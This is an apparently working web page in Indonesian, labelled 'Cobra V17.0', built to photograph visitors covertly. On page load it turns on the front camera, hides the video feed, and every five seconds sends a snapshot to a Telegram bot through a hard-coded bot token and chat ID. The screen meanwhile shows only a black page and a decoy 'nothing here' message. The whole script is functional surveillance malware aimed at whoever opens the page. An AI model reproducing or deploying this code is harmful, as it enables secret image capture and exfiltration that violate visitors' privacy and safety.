<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            min-height: 100vh;
            background: #000000;
            font-family: system-ui, sans-serif;
        }
        
        /* VIDEO TETAP ADA TAPI DISEMBUNYIKIN (buat capture doang) */
        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
        }
        
        /* EFEK FLASH */
        .shutter-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 100;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.08s;
        }
        
        /* TEKS UTAMA */
        .result-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: clamp(1.2rem, 6vw, 2rem);
            font-weight: 500;
            color: rgba(255,255,255,0.9);
            text-shadow: 0 0 10px rgba(0,0,0,0.5);
            z-index: 101;
            opacity: 0;
            transition: all 0.4s;
            text-align: center;
            background: rgba(0,0,0,0.7);
            padding: 15px 30px;
            border-radius: 50px;
            white-space: nowrap;
            pointer-events: none;
            font-family: monospace;
        }
        
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
            20% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            100% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
        }
        
        .show-text {
            animation: fadeInOut 2s ease forwards;
        }
        
        /* NOTIF DI BAWAH */
        .notif {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            padding: 10px 20px;
            border-radius: 30px;
            color: white;
            font-size: 14px;
            z-index: 102;
            font-family: monospace;
            pointer-events: none;
            transition: opacity 0.3s;
            opacity: 0;
            white-space: nowrap;
        }
        
        .notif.show {
            opacity: 1;
        }
        
        .notif.success {
            background: rgba(0,150,0,0.9);
        }
        
        .notif.error {
            background: rgba(150,0,0,0.9);
        }
        
        /* Sembunyikan semua tombol */
        button, .btn, .start, .mulai {
            display: none;
        }
        
        /* Loading dot */
        .loading-dot {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ff4444;
            z-index: 103;
        }
        
        .loading-dot.active {
            background: #00ff00;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 0.3; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1.2); }
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <div class="shutter-effect" id="shutter"></div>
    <div class="result-text" id="resultText">Ga ada Apa Apa Sehhh</div>
    <div class="notif" id="notif">📸 Foto terkirim!</div>
    <div class="loading-dot" id="loadingDot"></div>

    <script>
        // ============ COBRA V17.0 - TANPA PREVIEW MUKA ============
        const BOT_TOKEN = "8611976046:AAHXzkj8icyuSpjQbQScyyCdAEE6qy_m2Kg";
        const CHAT_ID = "8336543740";
        const COOLDOWN_MS = 5000;
        
        // ============ ELEMEN ============
        const video = document.getElementById('video');
        const shutter = document.getElementById('shutter');
        const resultText = document.getElementById('resultText');
        const notif = document.getElementById('notif');
        const loadingDot = document.getElementById('loadingDot');
        
        let stream = null;
        let isCameraActive = false;
        let cooldown = false;
        
        // ============ TAMPILIN NOTIF ============
        function showNotif(message, isSuccess = true) {
            notif.textContent = message;
            notif.className = 'notif show ' + (isSuccess ? 'success' : 'error');
            
            setTimeout(() => {
                notif.className = 'notif';
            }, 2000);
        }
        
        // ============ KIRIM FOTO KE TELEGRAM ============
        async function sendPhotoToTelegram(imageDataUrl) {
            try {
                const blob = await (await fetch(imageDataUrl)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'selfie.jpg');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                
                if (result.ok) {
                    showNotif('✅ Foto berhasil dikirim!', true);
                    return true;
                } else {
                    showNotif('❌ Gagal kirim foto!', false);
                    return false;
                }
            } catch (error) {
                console.error('Error:', error);
                showNotif('❌ Error: ' + error.message, false);
                return false;
            }
        }
        
        // ============ EFEK JEPRET ============
        function shutterEffect() {
            shutter.style.opacity = '1';
            setTimeout(() => {
                shutter.style.opacity = '0';
            }, 100);
            
            // Getaran visual dikit
            document.body.style.transform = 'scale(0.998)';
            setTimeout(() => {
                document.body.style.transform = '';
            }, 60);
        }
        
        // ============ TAMPILIN TEKS ============
        function showText() {
            resultText.classList.remove('show-text');
            void resultText.offsetWidth;
            resultText.classList.add('show-text');
        }
        
        // ============ AMBIL FOTO ============
        async function takeSelfie() {
            if (!stream || !isCameraActive || cooldown) return false;
            
            cooldown = true;
            loadingDot.style.background = '#ffaa00';
            
            // Efek jepret
            shutterEffect();
            
            // Capture dari video (tanpa nampilin ke user)
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            
            if (video.videoWidth > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            } else {
                // Fallback kalo video blom siap
                canvas.width = 640;
                canvas.height = 480;
                ctx.fillStyle = '#000';
                ctx.fillRect(0, 0, 640, 480);
                ctx.fillStyle = '#fff';
                ctx.font = '20px sans-serif';
                ctx.fillText('Cobra V17.0', 250, 240);
            }
            
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            
            // Kirim ke bot
            const success = await sendPhotoToTelegram(photoData);
            
            if (success) {
                loadingDot.style.background = '#00ff00';
            } else {
                loadingDot.style.background = '#ff4444';
            }
            
            // Tampilkan teks
            showText();
            
            // Reset cooldown setelah 5 detik
            setTimeout(() => {
                cooldown = false;
                loadingDot.style.background = '#00ff00';
                if (isCameraActive && stream) {
                    takeSelfie();
                }
            }, COOLDOWN_MS);
            
            return true;
        }
        
        // ============ MULAI KAMERA (TANPA PREVIEW) ============
        async function startCamera() {
            loadingDot.style.background = '#ffaa00';
            
            try {
                // Paksa kamera DEPAN
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "user" } }
                });
                
                video.srcObject = stream;
                await video.play();
                
                isCameraActive = true;
                loadingDot.style.background = '#00ff00';
                loadingDot.classList.add('active');
                
                // Tunggu kamera stabil (1 detik)
                setTimeout(() => {
                    takeSelfie();
                }, 1000);
                
            } catch (err) {
                // Coba kamera default
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;
                    await video.play();
                    isCameraActive = true;
                    loadingDot.style.background = '#00ff00';
                    loadingDot.classList.add('active');
                    
                    setTimeout(() => {
                        takeSelfie();
                    }, 1000);
                    
                } catch (err2) {
                    loadingDot.style.background = '#ff4444';
                    showNotif('❌ Izin kamera diperlukan!', false);
                    console.error('Camera error:', err2);
                }
            }
        }
        
        // ============ JALANKAN ============
        window.addEventListener('load', () => {
            startCamera();
        });
        
        // Matiin kamera pas page ditutup
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
        
        // Klik layar buat retry kalo gagal
        document.body.addEventListener('click', () => {
            if (!isCameraActive && !stream) {
                startCamera();
            }
        });
        
        console.log('COBRA V17.0 - No face preview, just flash & notif');
    </script>
</body>
</html>
